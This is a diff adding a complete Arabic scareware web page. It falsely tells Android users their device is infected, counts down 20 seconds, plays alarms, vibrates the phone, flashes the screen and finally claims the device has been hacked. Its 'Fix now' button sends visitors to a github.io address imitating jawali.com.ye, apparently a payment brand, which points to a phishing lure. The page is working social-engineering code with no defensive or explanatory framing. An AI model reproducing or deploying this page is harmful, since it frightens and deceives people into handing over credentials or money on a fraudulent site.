@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8">
+    <title>⚠️ تنبيه الفيروسات ⚠️</title>
+    <style>
+      body {
+        background-color: black;
+        color: red;
+        text-align: center;
+        font-family: Arial, sans-serif;
+        margin-top: 100px;
+        transition: background-color 0.2s;
+      }
+
+      #countdown {
+        font-size: 24px;
+        margin: 20px 0;
+      }
+
+      button {
+        padding: 10px 20px;
+        font-size: 18px;
+        cursor: pointer;
+        background-color: red;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        animation: pulse 1s infinite;
+      }
+
+      .flash {
+        animation: flash-bg 0.2s infinite alternate;
+      }
+
+      @keyframes flash-bg {
+        from { background-color: red; }
+        to { background-color: white; color: black; }
+      }
+
+      @keyframes pulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.1); }
+        100% { transform: scale(1); }
+      }
+    </style>
+  </head>
+  <body>
+    <h1>⚠️ تنبيه أمني خطير ⚠️</h1>
+    <p>جهاز Android الخاص بك مصاب!</p>
+    <p>إذا لم يتم إصلاحه في <span id="countdown">20</span> ثانية، ستفقد بياناتك!</p>
+
+    <button onclick="window.location.href='https://sn4a5s6h.github.io/jawali.com.ye/'">إصلاح الآن</button>
+
+    <!-- صوت إنذار أول -->
+    <audio id="alarm-sound">
+      <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
+    </audio>
+
+    <!-- صوت صدمة نهائية -->
+    <audio id="final-sound">
+      <source src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" type="audio/ogg">
+    </audio>
+
+    <script>
+      let timeLeft = 20;
+      const countdownEl = document.getElementById("countdown");
+      const alarmSound = document.getElementById("alarm-sound");
+      const finalSound = document.getElementById("final-sound");
+      const body = document.body;
+
+      // رفع مستوى الصوت إلى 100%
+      alarmSound.volume = 1.0;
+      finalSound.volume = 1.0;
+
+      const timer = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+
+        if (timeLeft === 10) {
+          alarmSound.play();
+        }
+
+        if (timeLeft === 5 && navigator.vibrate) {
+          navigator.vibrate([500, 200, 500]);
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          countdownEl.textContent = "0";
+          finalSound.play();
+          body.classList.add("flash");
+
+          if (navigator.vibrate) {
+            navigator.vibrate([300, 100, 300, 100, 300]);
+          }
+
+          setTimeout(() => {
+            alert("تم اختراق جهازك");
+          }, 1500);
+        }
+      }, 1000);
+    </script>
+  </body>
+</html>
